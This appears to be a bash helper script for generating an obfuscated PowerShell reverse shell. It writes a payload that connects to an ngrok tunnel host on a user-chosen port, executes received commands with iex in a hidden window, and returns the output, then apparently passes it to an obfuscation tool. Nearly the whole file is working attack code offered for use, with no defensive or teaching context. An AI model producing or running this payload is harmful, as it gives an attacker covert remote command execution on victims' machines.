#!/bin/bash

# Navigate to the tools directory
# Prompt the user for the port number
cd tools/Invoke-PSObfuscation/
read -p "Enter the port number: " port

# Create the shell.txt file with the PowerShell command
cat <<EOF > shell.txt
Start-Process \$PSHOME\powershell.exe -ArgumentList {\$client = New-Object System.Net.Sockets.TCPClient('0.tcp.in.ngrok.io',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()} -WindowStyle Hidden
EOF

pwsh -File ./shell.ps1
cat shell
